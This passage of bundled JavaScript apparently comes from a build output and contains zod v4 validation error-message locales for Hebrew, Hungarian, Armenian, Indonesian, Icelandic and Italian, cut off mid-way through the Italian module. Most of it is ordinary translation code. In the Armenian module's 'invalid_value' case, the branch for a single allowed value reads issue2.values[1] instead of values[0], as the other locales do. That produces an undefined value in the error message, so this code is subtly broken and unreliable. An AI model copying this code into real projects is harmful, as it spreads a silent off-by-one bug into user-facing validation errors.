        if (issue2.origin === "string") {
          return `${sizing?.shortLabel ?? "\u05E7\u05E6\u05E8"} \u05DE\u05D3\u05D9: ${subject} \u05E6\u05E8\u05D9\u05DB\u05D4 \u05DC\u05D4\u05DB\u05D9\u05DC ${issue2.minimum.toString()} ${sizing?.unit ?? ""} ${issue2.inclusive ? "\u05D0\u05D5 \u05D9\u05D5\u05EA\u05E8" : "\u05DC\u05E4\u05D7\u05D5\u05EA"}`.trim();
        }
        if (issue2.origin === "number") {
          const comparison = issue2.inclusive ? `\u05D2\u05D3\u05D5\u05DC \u05D0\u05D5 \u05E9\u05D5\u05D5\u05D4 \u05DC-${issue2.minimum}` : `\u05D2\u05D3\u05D5\u05DC \u05DE-${issue2.minimum}`;
          return `\u05E7\u05D8\u05DF \u05DE\u05D3\u05D9: ${subject} \u05E6\u05E8\u05D9\u05DA \u05DC\u05D4\u05D9\u05D5\u05EA ${comparison}`;
        }
        if (issue2.origin === "array" || issue2.origin === "set") {
          const verb = issue2.origin === "set" ? "\u05E6\u05E8\u05D9\u05DB\u05D4" : "\u05E6\u05E8\u05D9\u05DA";
          if (issue2.minimum === 1 && issue2.inclusive) {
            const singularPhrase = issue2.origin === "set" ? "\u05DC\u05E4\u05D7\u05D5\u05EA \u05E4\u05E8\u05D9\u05D8 \u05D0\u05D7\u05D3" : "\u05DC\u05E4\u05D7\u05D5\u05EA \u05E4\u05E8\u05D9\u05D8 \u05D0\u05D7\u05D3";
            return `\u05E7\u05D8\u05DF \u05DE\u05D3\u05D9: ${subject} ${verb} \u05DC\u05D4\u05DB\u05D9\u05DC ${singularPhrase}`;
          }
          const comparison = issue2.inclusive ? `${issue2.minimum} ${sizing?.unit ?? ""} \u05D0\u05D5 \u05D9\u05D5\u05EA\u05E8` : `\u05D9\u05D5\u05EA\u05E8 \u05DE-${issue2.minimum} ${sizing?.unit ?? ""}`;
          return `\u05E7\u05D8\u05DF \u05DE\u05D3\u05D9: ${subject} ${verb} \u05DC\u05D4\u05DB\u05D9\u05DC ${comparison}`.trim();
        }
        const adj = issue2.inclusive ? ">=" : ">";
        const be = verbFor(issue2.origin ?? "value");
        if (sizing?.unit) {
          return `${sizing.shortLabel} \u05DE\u05D3\u05D9: ${subject} ${be} ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `${sizing?.shortLabel ?? "\u05E7\u05D8\u05DF"} \u05DE\u05D3\u05D9: ${subject} ${be} ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `\u05D4\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05D7\u05D9\u05D9\u05D1\u05EA \u05DC\u05D4\u05EA\u05D7\u05D9\u05DC \u05D1 "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `\u05D4\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05D7\u05D9\u05D9\u05D1\u05EA \u05DC\u05D4\u05E1\u05EA\u05D9\u05D9\u05DD \u05D1 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u05D4\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05D7\u05D9\u05D9\u05D1\u05EA \u05DC\u05DB\u05DC\u05D5\u05DC "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u05D4\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05D7\u05D9\u05D9\u05D1\u05EA \u05DC\u05D4\u05EA\u05D0\u05D9\u05DD \u05DC\u05EA\u05D1\u05E0\u05D9\u05EA ${_issue.pattern}`;
        const nounEntry = FormatDictionary[_issue.format];
        const noun = nounEntry?.label ?? _issue.format;
        const gender = nounEntry?.gender ?? "m";
        const adjective = gender === "f" ? "\u05EA\u05E7\u05D9\u05E0\u05D4" : "\u05EA\u05E7\u05D9\u05DF";
        return `${noun} \u05DC\u05D0 ${adjective}`;
      }
      case "not_multiple_of":
        return `\u05DE\u05E1\u05E4\u05E8 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF: \u05D7\u05D9\u05D9\u05D1 \u05DC\u05D4\u05D9\u05D5\u05EA \u05DE\u05DB\u05E4\u05DC\u05D4 \u05E9\u05DC ${issue2.divisor}`;
      case "unrecognized_keys":
        return `\u05DE\u05E4\u05EA\u05D7${issue2.keys.length > 1 ? "\u05D5\u05EA" : ""} \u05DC\u05D0 \u05DE\u05D6\u05D5\u05D4${issue2.keys.length > 1 ? "\u05D9\u05DD" : "\u05D4"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key": {
        return `\u05E9\u05D3\u05D4 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF \u05D1\u05D0\u05D5\u05D1\u05D9\u05D9\u05E7\u05D8`;
      }
      case "invalid_union":
        return "\u05E7\u05DC\u05D8 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF";
      case "invalid_element": {
        const place = withDefinite(issue2.origin ?? "array");
        return `\u05E2\u05E8\u05DA \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF \u05D1${place}`;
      }
      default:
        return `\u05E7\u05DC\u05D8 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF`;
    }
  };
};
function he_default() {
  return {
    localeError: error16()
  };
}
// node_modules/zod/v4/locales/hu.js
var error17 = () => {
  const Sizable = {
    string: { unit: "karakter", verb: "legyen" },
    file: { unit: "byte", verb: "legyen" },
    array: { unit: "elem", verb: "legyen" },
    set: { unit: "elem", verb: "legyen" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "bemenet",
    email: "email c\xEDm",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO id\u0151b\xE9lyeg",
    date: "ISO d\xE1tum",
    time: "ISO id\u0151",
    duration: "ISO id\u0151intervallum",
    ipv4: "IPv4 c\xEDm",
    ipv6: "IPv6 c\xEDm",
    cidrv4: "IPv4 tartom\xE1ny",
    cidrv6: "IPv6 tartom\xE1ny",
    base64: "base64-k\xF3dolt string",
    base64url: "base64url-k\xF3dolt string",
    json_string: "JSON string",
    e164: "E.164 sz\xE1m",
    jwt: "JWT",
    template_literal: "bemenet"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "sz\xE1m",
    array: "t\xF6mb"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\xC9rv\xE9nytelen bemenet: a v\xE1rt \xE9rt\xE9k instanceof ${issue2.expected}, a kapott \xE9rt\xE9k ${received}`;
        }
        return `\xC9rv\xE9nytelen bemenet: a v\xE1rt \xE9rt\xE9k ${expected}, a kapott \xE9rt\xE9k ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\xC9rv\xE9nytelen bemenet: a v\xE1rt \xE9rt\xE9k ${stringifyPrimitive(issue2.values[0])}`;
        return `\xC9rv\xE9nytelen opci\xF3: valamelyik \xE9rt\xE9k v\xE1rt ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `T\xFAl nagy: ${issue2.origin ?? "\xE9rt\xE9k"} m\xE9rete t\xFAl nagy ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elem"}`;
        return `T\xFAl nagy: a bemeneti \xE9rt\xE9k ${issue2.origin ?? "\xE9rt\xE9k"} t\xFAl nagy: ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `T\xFAl kicsi: a bemeneti \xE9rt\xE9k ${issue2.origin} m\xE9rete t\xFAl kicsi ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `T\xFAl kicsi: a bemeneti \xE9rt\xE9k ${issue2.origin} t\xFAl kicsi ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `\xC9rv\xE9nytelen string: "${_issue.prefix}" \xE9rt\xE9kkel kell kezd\u0151dnie`;
        if (_issue.format === "ends_with")
          return `\xC9rv\xE9nytelen string: "${_issue.suffix}" \xE9rt\xE9kkel kell v\xE9gz\u0151dnie`;
        if (_issue.format === "includes")
          return `\xC9rv\xE9nytelen string: "${_issue.includes}" \xE9rt\xE9ket kell tartalmaznia`;
        if (_issue.format === "regex")
          return `\xC9rv\xE9nytelen string: ${_issue.pattern} mint\xE1nak kell megfelelnie`;
        return `\xC9rv\xE9nytelen ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\xC9rv\xE9nytelen sz\xE1m: ${issue2.divisor} t\xF6bbsz\xF6r\xF6s\xE9nek kell lennie`;
      case "unrecognized_keys":
        return `Ismeretlen kulcs${issue2.keys.length > 1 ? "s" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\xC9rv\xE9nytelen kulcs ${issue2.origin}`;
      case "invalid_union":
        return "\xC9rv\xE9nytelen bemenet";
      case "invalid_element":
        return `\xC9rv\xE9nytelen \xE9rt\xE9k: ${issue2.origin}`;
      default:
        return `\xC9rv\xE9nytelen bemenet`;
    }
  };
};
function hu_default() {
  return {
    localeError: error17()
  };
}
// node_modules/zod/v4/locales/hy.js
function getArmenianPlural(count, one, many) {
  return Math.abs(count) === 1 ? one : many;
}
function withDefiniteArticle(word) {
  if (!word)
    return "";
  const vowels = ["\u0561", "\u0565", "\u0568", "\u056B", "\u0578", "\u0578\u0582", "\u0585"];
  const lastChar = word[word.length - 1];
  return word + (vowels.includes(lastChar) ? "\u0576" : "\u0568");
}
var error18 = () => {
  const Sizable = {
    string: {
      unit: {
        one: "\u0576\u0577\u0561\u0576",
        many: "\u0576\u0577\u0561\u0576\u0576\u0565\u0580"
      },
      verb: "\u0578\u0582\u0576\u0565\u0576\u0561\u056C"
    },
    file: {
      unit: {
        one: "\u0562\u0561\u0575\u0569",
        many: "\u0562\u0561\u0575\u0569\u0565\u0580"
      },
      verb: "\u0578\u0582\u0576\u0565\u0576\u0561\u056C"
    },
    array: {
      unit: {
        one: "\u057F\u0561\u0580\u0580",
        many: "\u057F\u0561\u0580\u0580\u0565\u0580"
      },
      verb: "\u0578\u0582\u0576\u0565\u0576\u0561\u056C"
    },
    set: {
      unit: {
        one: "\u057F\u0561\u0580\u0580",
        many: "\u057F\u0561\u0580\u0580\u0565\u0580"
      },
      verb: "\u0578\u0582\u0576\u0565\u0576\u0561\u056C"
    }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0574\u0578\u0582\u057F\u0584",
    email: "\u0567\u056C. \u0570\u0561\u057D\u0581\u0565",
    url: "URL",
    emoji: "\u0567\u0574\u0578\u057B\u056B",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u0561\u0574\u057D\u0561\u0569\u056B\u057E \u0587 \u056A\u0561\u0574",
    date: "ISO \u0561\u0574\u057D\u0561\u0569\u056B\u057E",
    time: "ISO \u056A\u0561\u0574",
    duration: "ISO \u057F\u0587\u0578\u0572\u0578\u0582\u0569\u0575\u0578\u0582\u0576",
    ipv4: "IPv4 \u0570\u0561\u057D\u0581\u0565",
    ipv6: "IPv6 \u0570\u0561\u057D\u0581\u0565",
    cidrv4: "IPv4 \u0574\u056B\u057B\u0561\u056F\u0561\u0575\u0584",
    cidrv6: "IPv6 \u0574\u056B\u057B\u0561\u056F\u0561\u0575\u0584",
    base64: "base64 \u0571\u0587\u0561\u0579\u0561\u0583\u0578\u057E \u057F\u0578\u0572",
    base64url: "base64url \u0571\u0587\u0561\u0579\u0561\u0583\u0578\u057E \u057F\u0578\u0572",
    json_string: "JSON \u057F\u0578\u0572",
    e164: "E.164 \u0570\u0561\u0574\u0561\u0580",
    jwt: "JWT",
    template_literal: "\u0574\u0578\u0582\u057F\u0584"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u0569\u056B\u057E",
    array: "\u0566\u0561\u0576\u0563\u057E\u0561\u056E"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u054D\u056D\u0561\u056C \u0574\u0578\u0582\u057F\u0584\u0561\u0563\u0580\u0578\u0582\u0574\u2024 \u057D\u057A\u0561\u057D\u057E\u0578\u0582\u0574 \u0567\u0580 instanceof ${issue2.expected}, \u057D\u057F\u0561\u0581\u057E\u0565\u056C \u0567 ${received}`;
        }
        return `\u054D\u056D\u0561\u056C \u0574\u0578\u0582\u057F\u0584\u0561\u0563\u0580\u0578\u0582\u0574\u2024 \u057D\u057A\u0561\u057D\u057E\u0578\u0582\u0574 \u0567\u0580 ${expected}, \u057D\u057F\u0561\u0581\u057E\u0565\u056C \u0567 ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u054D\u056D\u0561\u056C \u0574\u0578\u0582\u057F\u0584\u0561\u0563\u0580\u0578\u0582\u0574\u2024 \u057D\u057A\u0561\u057D\u057E\u0578\u0582\u0574 \u0567\u0580 ${stringifyPrimitive(issue2.values[1])}`;
        return `\u054D\u056D\u0561\u056C \u057F\u0561\u0580\u0562\u0565\u0580\u0561\u056F\u2024 \u057D\u057A\u0561\u057D\u057E\u0578\u0582\u0574 \u0567\u0580 \u0570\u0565\u057F\u0587\u0575\u0561\u056C\u0576\u0565\u0580\u056B\u0581 \u0574\u0565\u056F\u0568\u055D ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          const maxValue = Number(issue2.maximum);
          const unit = getArmenianPlural(maxValue, sizing.unit.one, sizing.unit.many);
          return `\u0549\u0561\u0583\u0561\u0566\u0561\u0576\u0581 \u0574\u0565\u056E \u0561\u0580\u056A\u0565\u0584\u2024 \u057D\u057A\u0561\u057D\u057E\u0578\u0582\u0574 \u0567, \u0578\u0580 ${withDefiniteArticle(issue2.origin ?? "\u0561\u0580\u056A\u0565\u0584")} \u056F\u0578\u0582\u0576\u0565\u0576\u0561 ${adj}${issue2.maximum.toString()} ${unit}`;
        }
        return `\u0549\u0561\u0583\u0561\u0566\u0561\u0576\u0581 \u0574\u0565\u056E \u0561\u0580\u056A\u0565\u0584\u2024 \u057D\u057A\u0561\u057D\u057E\u0578\u0582\u0574 \u0567, \u0578\u0580 ${withDefiniteArticle(issue2.origin ?? "\u0561\u0580\u056A\u0565\u0584")} \u056C\u056B\u0576\u056B ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          const minValue = Number(issue2.minimum);
          const unit = getArmenianPlural(minValue, sizing.unit.one, sizing.unit.many);
          return `\u0549\u0561\u0583\u0561\u0566\u0561\u0576\u0581 \u0583\u0578\u0584\u0580 \u0561\u0580\u056A\u0565\u0584\u2024 \u057D\u057A\u0561\u057D\u057E\u0578\u0582\u0574 \u0567, \u0578\u0580 ${withDefiniteArticle(issue2.origin)} \u056F\u0578\u0582\u0576\u0565\u0576\u0561 ${adj}${issue2.minimum.toString()} ${unit}`;
        }
        return `\u0549\u0561\u0583\u0561\u0566\u0561\u0576\u0581 \u0583\u0578\u0584\u0580 \u0561\u0580\u056A\u0565\u0584\u2024 \u057D\u057A\u0561\u057D\u057E\u0578\u0582\u0574 \u0567, \u0578\u0580 ${withDefiniteArticle(issue2.origin)} \u056C\u056B\u0576\u056B ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `\u054D\u056D\u0561\u056C \u057F\u0578\u0572\u2024 \u057A\u0565\u057F\u0584 \u0567 \u057D\u056F\u057D\u057E\u056B "${_issue.prefix}"-\u0578\u057E`;
        if (_issue.format === "ends_with")
          return `\u054D\u056D\u0561\u056C \u057F\u0578\u0572\u2024 \u057A\u0565\u057F\u0584 \u0567 \u0561\u057E\u0561\u0580\u057F\u057E\u056B "${_issue.suffix}"-\u0578\u057E`;
        if (_issue.format === "includes")
          return `\u054D\u056D\u0561\u056C \u057F\u0578\u0572\u2024 \u057A\u0565\u057F\u0584 \u0567 \u057A\u0561\u0580\u0578\u0582\u0576\u0561\u056F\u056B "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u054D\u056D\u0561\u056C \u057F\u0578\u0572\u2024 \u057A\u0565\u057F\u0584 \u0567 \u0570\u0561\u0574\u0561\u057A\u0561\u057F\u0561\u057D\u056D\u0561\u0576\u056B ${_issue.pattern} \u0571\u0587\u0561\u0579\u0561\u0583\u056B\u0576`;
        return `\u054D\u056D\u0561\u056C ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u054D\u056D\u0561\u056C \u0569\u056B\u057E\u2024 \u057A\u0565\u057F\u0584 \u0567 \u0562\u0561\u0566\u0574\u0561\u057A\u0561\u057F\u056B\u056F \u056C\u056B\u0576\u056B ${issue2.divisor}-\u056B`;
      case "unrecognized_keys":
        return `\u0549\u0573\u0561\u0576\u0561\u0579\u057E\u0561\u056E \u0562\u0561\u0576\u0561\u056C\u056B${issue2.keys.length > 1 ? "\u0576\u0565\u0580" : ""}. ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\u054D\u056D\u0561\u056C \u0562\u0561\u0576\u0561\u056C\u056B ${withDefiniteArticle(issue2.origin)}-\u0578\u0582\u0574`;
      case "invalid_union":
        return "\u054D\u056D\u0561\u056C \u0574\u0578\u0582\u057F\u0584\u0561\u0563\u0580\u0578\u0582\u0574";
      case "invalid_element":
        return `\u054D\u056D\u0561\u056C \u0561\u0580\u056A\u0565\u0584 ${withDefiniteArticle(issue2.origin)}-\u0578\u0582\u0574`;
      default:
        return `\u054D\u056D\u0561\u056C \u0574\u0578\u0582\u057F\u0584\u0561\u0563\u0580\u0578\u0582\u0574`;
    }
  };
};
function hy_default() {
  return {
    localeError: error18()
  };
}
// node_modules/zod/v4/locales/id.js
var error19 = () => {
  const Sizable = {
    string: { unit: "karakter", verb: "memiliki" },
    file: { unit: "byte", verb: "memiliki" },
    array: { unit: "item", verb: "memiliki" },
    set: { unit: "item", verb: "memiliki" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "input",
    email: "alamat email",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "tanggal dan waktu format ISO",
    date: "tanggal format ISO",
    time: "jam format ISO",
    duration: "durasi format ISO",
    ipv4: "alamat IPv4",
    ipv6: "alamat IPv6",
    cidrv4: "rentang alamat IPv4",
    cidrv6: "rentang alamat IPv6",
    base64: "string dengan enkode base64",
    base64url: "string dengan enkode base64url",
    json_string: "string JSON",
    e164: "angka E.164",
    jwt: "JWT",
    template_literal: "input"
  };
  const TypeDictionary = {
    nan: "NaN"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Input tidak valid: diharapkan instanceof ${issue2.expected}, diterima ${received}`;
        }
        return `Input tidak valid: diharapkan ${expected}, diterima ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Input tidak valid: diharapkan ${stringifyPrimitive(issue2.values[0])}`;
        return `Pilihan tidak valid: diharapkan salah satu dari ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Terlalu besar: diharapkan ${issue2.origin ?? "value"} memiliki ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elemen"}`;
        return `Terlalu besar: diharapkan ${issue2.origin ?? "value"} menjadi ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Terlalu kecil: diharapkan ${issue2.origin} memiliki ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Terlalu kecil: diharapkan ${issue2.origin} menjadi ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `String tidak valid: harus dimulai dengan "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `String tidak valid: harus berakhir dengan "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `String tidak valid: harus menyertakan "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `String tidak valid: harus sesuai pola ${_issue.pattern}`;
        return `${FormatDictionary[_issue.format] ?? issue2.format} tidak valid`;
      }
      case "not_multiple_of":
        return `Angka tidak valid: harus kelipatan dari ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Kunci tidak dikenali ${issue2.keys.length > 1 ? "s" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Kunci tidak valid di ${issue2.origin}`;
      case "invalid_union":
        return "Input tidak valid";
      case "invalid_element":
        return `Nilai tidak valid di ${issue2.origin}`;
      default:
        return `Input tidak valid`;
    }
  };
};
function id_default() {
  return {
    localeError: error19()
  };
}
// node_modules/zod/v4/locales/is.js
var error20 = () => {
  const Sizable = {
    string: { unit: "stafi", verb: "a\xF0 hafa" },
    file: { unit: "b\xE6ti", verb: "a\xF0 hafa" },
    array: { unit: "hluti", verb: "a\xF0 hafa" },
    set: { unit: "hluti", verb: "a\xF0 hafa" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "gildi",
    email: "netfang",
    url: "vefsl\xF3\xF0",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO dagsetning og t\xEDmi",
    date: "ISO dagsetning",
    time: "ISO t\xEDmi",
    duration: "ISO t\xEDmalengd",
    ipv4: "IPv4 address",
    ipv6: "IPv6 address",
    cidrv4: "IPv4 range",
    cidrv6: "IPv6 range",
    base64: "base64-encoded strengur",
    base64url: "base64url-encoded strengur",
    json_string: "JSON strengur",
    e164: "E.164 t\xF6lugildi",
    jwt: "JWT",
    template_literal: "gildi"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "n\xFAmer",
    array: "fylki"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Rangt gildi: \xDE\xFA sl\xF3st inn ${received} \xFEar sem \xE1 a\xF0 vera instanceof ${issue2.expected}`;
        }
        return `Rangt gildi: \xDE\xFA sl\xF3st inn ${received} \xFEar sem \xE1 a\xF0 vera ${expected}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Rangt gildi: gert r\xE1\xF0 fyrir ${stringifyPrimitive(issue2.values[0])}`;
        return `\xD3gilt val: m\xE1 vera eitt af eftirfarandi ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Of st\xF3rt: gert er r\xE1\xF0 fyrir a\xF0 ${issue2.origin ?? "gildi"} hafi ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "hluti"}`;
        return `Of st\xF3rt: gert er r\xE1\xF0 fyrir a\xF0 ${issue2.origin ?? "gildi"} s\xE9 ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Of l\xEDti\xF0: gert er r\xE1\xF0 fyrir a\xF0 ${issue2.origin} hafi ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Of l\xEDti\xF0: gert er r\xE1\xF0 fyrir a\xF0 ${issue2.origin} s\xE9 ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `\xD3gildur strengur: ver\xF0ur a\xF0 byrja \xE1 "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `\xD3gildur strengur: ver\xF0ur a\xF0 enda \xE1 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\xD3gildur strengur: ver\xF0ur a\xF0 innihalda "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\xD3gildur strengur: ver\xF0ur a\xF0 fylgja mynstri ${_issue.pattern}`;
        return `Rangt ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `R\xF6ng tala: ver\xF0ur a\xF0 vera margfeldi af ${issue2.divisor}`;
      case "unrecognized_keys":
        return `\xD3\xFEekkt ${issue2.keys.length > 1 ? "ir lyklar" : "ur lykill"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Rangur lykill \xED ${issue2.origin}`;
      case "invalid_union":
        return "Rangt gildi";
      case "invalid_element":
        return `Rangt gildi \xED ${issue2.origin}`;
      default:
        return `Rangt gildi`;
    }
  };
};
function is_default() {
  return {
    localeError: error20()
  };
}
// node_modules/zod/v4/locales/it.js
var error21 = () => {
  const Sizable = {
    string: { unit: "caratteri", verb: "avere" },
    file: { unit: "byte", verb: "avere" },
    array: { unit: "elementi", verb: "avere" },
    set: { unit: "elementi", verb: "avere" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "input",
    email: "indirizzo email",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "data e ora ISO",
    date: "data ISO",
    time: "ora ISO",
    duration: "durata ISO",
    ipv4: "indirizzo IPv4",
    ipv6: "indirizzo IPv6",
    cidrv4: "intervallo IPv4",
    cidrv6: "intervallo IPv6",
    base64: "stringa codificata in base64",
    base64url: "URL codificata in base64",
    json_string: "stringa JSON",
    e164: "numero E.164",
    jwt: "JWT",
    template_literal: "input"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "numero",
    array: "vettore"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Input non valido: atteso instanceof ${issue2.expected}, ricevuto ${received}`;
        }
        return `Input non valido: atteso ${expected}, ricevuto ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Input non valido: atteso ${stringifyPrimitive(issue2.values[0])}`;
        return `Opzione non valida: atteso uno tra ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Troppo grande: ${issue2.origin ?? "valore"} deve avere ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elementi"}`;
        return `Troppo grande: ${issue2.origin ?? "valore"} deve essere ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Troppo piccolo: ${issue2.origin} deve avere ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Troppo piccolo: ${issue2.origin} deve essere ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Stringa non valida: deve iniziare con "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Stringa non valida: deve terminare con "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Stringa non valida: deve includere "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Stringa non valida: deve corrispondere al pattern ${_issue.pattern}`;
        return `Invalid ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Numero non valido: deve essere un multiplo di ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Chiav${issue2.keys.length > 1 ? "i" : "e"} non riconosciut${issue2.keys.length > 1 ? "e" : "a"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
